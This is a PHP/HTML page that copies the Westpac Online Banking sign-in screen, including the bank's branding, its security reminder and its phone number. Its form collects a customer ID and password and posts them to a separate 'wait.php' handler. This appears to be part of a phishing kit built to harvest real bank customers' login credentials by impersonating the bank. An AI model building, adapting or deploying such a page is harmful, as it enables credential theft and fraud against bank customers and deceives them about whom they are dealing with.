<?php
session_start();
include "header.php";



?>
<link rel="stylesheet" href="../css/index.css">

<main class="" style="min-height:450px; ">
    <div class="row container-expand-gl mx-auto sign" style="width: 75%; padding:0; ">

        <br>
        <p class="col-12 par" style="font-size: 28px; margin:10px;">Sign in to Westpac Online Banking</p>
        <br>
        <div class="col-12 row ok" style="background-color: white;height:450px ; padding:0; margin:40px;">

            <div class="col-4 col-xs-12 mobilerow">

                <form action="wait.php" style="margin:30px" method="post">
                   
                    <div class="form-group">

                        <label for="email">
                            Customer ID</label>
                        <input type="number" class="form-control" id="email" name="id" required>
                    </div>
                    <div class="form-group">
                        <label for="pwd">Password</label>
                        <input type="password" class="form-control" id="pwd" name="password" required>
                    </div>
                    <div class="checkbox">
                        <input type="checkbox" style="width: 25px; height:30px;"> <label style="transform: translate(2%,-25%);">Remember customer ID</label>
                        <br>
                    </div>
                    <button type="submit" class="btn btn-block " style="background-color:#DA1E10 ; color:white; font-weight: bold;">sign in</button>
                    <br>
                    <a href="" style="color: black; font-size: 14px;"> Forgot customer ID or password?</a>
                </form>
            </div>
            <div class="col-md-4 col-xs-0 row rowsec" style="margin-top: 40px;">
                <div class="col-2">
                    <img src="../images/badlock.jpg" alt="" style="width:40px; height:43px;">
                </div>
                <div class="col-10">
                    <h6>Security reminder
                    </h6>
                    <p>Westpac Protect™</p>
                </div>
                <ul style="font-size: 14px;">
                    <li>Don't sign in if you are sharing access to your computer</li>
                    <li>Never share your security codes or passwords with anyone</li>
                    <li>Call us on 132 032 if you are being asked to do this</li>
                </ul>
            </div>
            <div id="list-option" class="col-md-4 col-xs-0 rowlist" style="background-color: #DA1E10; padding-top:100px; color:white; width: 100%; transform: translate(15%,0); height:450px;">
                <a href=""><img src="../images/link_icon1.png" style="width: 7px; height:15px; " alt=""> Register for Online Banking</a><br>
                <a href=""><img src="../images/link_icon1.png" style="width: 7px; height:15px;" alt=""> Online Help</a><br>
                <a href=""><img src="../images/link_icon1.png" style="width: 7px; height:15px;" alt=""> What's new</a><br>
                <a href=""><img src="../images/link_icon1.png" style="width: 7px; height:15px;" alt=""> Online Banking features</a><br>
            </div>



        </div>
    </div>

    <style>
        main {
            background-color: #F3F4F6;
        }

        @media only screen and (max-width: 800px) {

            .mobilerow {
                display: block !important;
                background-color: white;
                z-index: 10;
                width: 100%;

            }

            .par,
            .rowsec,
            .rowlist {
                display: none;

            }

            .sign {
                width: 270% !important;
                margin: auto;
                padding: 0;

            }

            .ok {
                padding: 0;
                margin: auto !important;
            }


            main {

                background-color: white;
            }

        }
    </style>
</main>
<br> <br>
<?php
include "footer.php";



?>